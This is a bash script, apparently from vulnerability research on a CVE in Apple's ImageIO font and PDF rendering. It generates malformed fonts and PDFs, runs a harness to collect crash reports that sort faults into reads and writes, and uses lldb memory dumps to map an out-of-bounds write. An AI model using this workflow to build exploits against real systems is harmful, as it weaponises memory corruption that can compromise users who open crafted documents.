#!/bin/bash
# RIP-3: wild-write census — native .ips per crash L (fault addr class + site offset
# READ(+1828/+2476 ldrh) vs WRITE(+1868 str/+2396 strh)) + traced neg-band session E.
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 8
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
Ls = [-27648, -26624, -24576, -22528, -20480, -18432, -17408, 28672, 29696, 30720, 31744, 32640, 64]
for L in Ls: build_font(f"k2_e{L}.ttf", L)
print("fonts built")
PYB
for L in -27648 -26624 -24576 -22528 -20480 -18432 -17408 28672 29696 30720 31744 32640 64; do
  ./venv/bin/python gen_pdf.py k2_e${L}.pdf k2_e${L}.ttf
done

IPSDIR="$HOME/Library/Logs/DiagnosticReports"
./venv/bin/python - << 'PYG'
import subprocess, os, glob, sys, re, json, time
Ls = [-27648, -26624, -24576, -22528, -20480, -18432, -17408,
      -17408, -17408, -17408, -17408, -17408,
      28672, 29696, 30720, 31744, 32640, 64]
IPS = os.path.expanduser("~/Library/Logs/DiagnosticReports")
out = open("census.txt", "w")
def W(*a): print(*a); print(*a, file=out)
for L in Ls:
    before = set(glob.glob(IPS + "/render4*.ips"))
    r = subprocess.run(['./render4', f'k2_e{L}.pdf', 'e.png'], capture_output=True, timeout=120)
    err = r.stderr.decode(errors='replace')
    done = 'PHASE done' in err
    rel = 'REL_CB fired' in err
    time.sleep(0.6)
    new = [f for f in glob.glob(IPS + "/render4*.ips") if f not in before]
    fa = site = '-'
    if new:
        new.sort(key=os.path.getmtime)
        raw = json.loads(open(new[-1]).read().split('\n', 1)[1])
        fa = raw.get('faultingAddress', raw.get('faultAddress', '-'))
        # exception type + frames
        try:
            ex = raw.get('exception', {})
            fa = ex.get('address', fa)
        except Exception: pass
        frames = raw.get('threads', [{}])[0].get('frames', [])
        imgs = raw.get('usedImages', [])
        site = []
        for fr in frames[:6]:
            try:
                img = imgs[fr.get('imageIndex', 0)]
                nm = img.get('name', '?')
                off = fr.get('imageOffset', 0)
                sym = fr.get('symbol', '')
                so = fr.get('symbolLocation', '')
                site.append(f"{nm}!{sym}+{so}@{off}")
            except Exception: pass
        site = " <- ".join(site)
        os.rename(new[-1], f"ips_L{L}_{len(glob.glob('ips_*'))}.ips")
    W("L=%6d rc=%3d done=%s rel=%s fault=%s" % (L, r.returncode, done, rel, fa))
    W("   site: %s" % site[:220])
out.close()
print("CENSUS DONE")
PYG

# session E: traced neg-band strike L=-20480 (offset -0x140000)
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_e-20480.pdf eS.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  for o in 0x13fc00 0x140000 0x140400 0x13f800; do
    echo "memory read --size 8 --count 48 --format x \$x27-$o"
  done
  echo "breakpoint delete 2"
  echo "continue"
  echo "bt"
  echo "register read x27 x16 x11 pc"
  for o in 0x13fc00 0x140000 0x140400; do
    echo "memory read --size 8 --count 48 --format x \$x27-$o"
  done
  echo "quit"
} > cmdsE.txt
lldb -b -s cmdsE.txt ./render4 > sessE.txt 2>&1 || true

# footprint diff
./venv/bin/python - << 'PYA'
import re
txt = open('sessE.txt', errors='replace').read()
x27s = re.findall(r'x27 = (0x[0-9a-f]+)', txt)
x27 = int(x27s[0], 16) if x27s else None
dumps = []
cur = []
for ln in txt.splitlines():
    m2 = re.match(r'^(0x[0-9a-f]+):\s((?:0x[0-9a-f]+\s*)+)$', ln.strip())
    if m2:
        addr = int(m2.group(1), 16)
        for v in m2.group(2).split():
            cur.append((addr, int(v, 16))); addr += 8
    elif cur:
        dumps.append(cur); cur = []
if cur: dumps.append(cur)
print("x27 =", hex(x27) if x27 else '?', "| dump blocks:", len(dumps))
if x27 and len(dumps) >= 8:
    pre, post = dumps[:4], dumps[4:8]
    n = 0
    for pi in range(min(len(pre), len(post))):
        pm = dict(pre[pi])
        for addr, v in post[pi]:
            if pm.get(addr) != v:
                n += 1
                if n <= 30: print("  chg %+d: %s -> %s" % (addr - x27, hex(pm.get(addr, 0)), hex(v)))
    print("  changed qwords:", n)
bt = [l.strip() for l in txt.splitlines() if 'frame #' in l]
print("BT tail:"); [print("  ", b[:140]) for b in bt[-5:]]
PYA

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{census.txt,sessE.txt,cmdsE.txt} findings/ 2>/dev/null
cp detonation/cve-2026-86950/ips_L*.ips findings/ 2>/dev/null
ls findings/ | head -30
grep -E "L=|site:" detonation/cve-2026-86950/census.txt | head -50
